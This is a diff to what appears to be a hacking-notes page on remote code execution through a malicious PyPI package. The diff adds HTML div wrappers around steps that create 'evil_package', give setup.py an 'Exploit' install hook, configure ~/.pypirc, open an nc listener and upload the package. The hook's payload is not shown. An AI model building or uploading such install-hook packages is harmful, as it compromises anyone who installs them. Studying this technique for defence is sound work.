@@ -9,6 +9,8 @@ tags: ["python", "pypi", "package", "rce"]
 
 #### 1. Create files
 
+<div>
+
 ```bash
 mkdir evil_package
 ```
@@ -37,7 +39,11 @@ touch setup.cfg
 touch setup.py
 ```
 
+</div>
+
 #### 2. Replace setup.py
+
+<div>
 
 ```python
 #!/usr/bin/env python3
@@ -68,7 +74,11 @@ setup(name="evil_package",
       cmdclass={"install": Exploit})
 ```
 
+</div>
+
 #### 3. Create ~/.pypirc
+
+<div>
 
 ```bash
 [distutils]
@@ -80,14 +90,22 @@ username: user
 password: password
 ```
 
+</div>
+
 #### 4. Exploit
+
+<div>
 
 ```bash
 # Open a nc listener
 rlwrap nc -lvnp 1337
 ```
 
+</div>
+
 <br>
+
+<div>
 
 ```bash
 # Create an archive
@@ -98,5 +116,7 @@ python3 setup.py sdist
 # Upload
 python3 setup.py sdist upload -r example
 ```
+
+</div>
 
 <br>
